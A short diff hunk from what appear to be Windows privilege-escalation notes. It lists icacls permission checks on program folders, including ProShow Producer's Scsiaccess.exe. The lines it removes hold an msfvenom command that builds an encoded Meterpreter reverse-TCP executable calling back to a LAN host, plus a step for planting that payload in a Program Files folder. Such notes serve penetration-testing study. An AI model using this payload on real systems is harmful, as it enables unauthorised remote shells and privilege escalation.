@@ -24,7 +24,3 @@ icacls "C:\Program Files (x86)\Program Folder"
 icacls "C:\Program Files\Photodex\ProShow Producer\Scsiaccess.exe"
 ```
 
-
-msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o A.exe
-Let’s place our payload to C:\Program Files (x86)\Program Folder folder:
-cd "../../../Program Files (x86)/Program Folder"
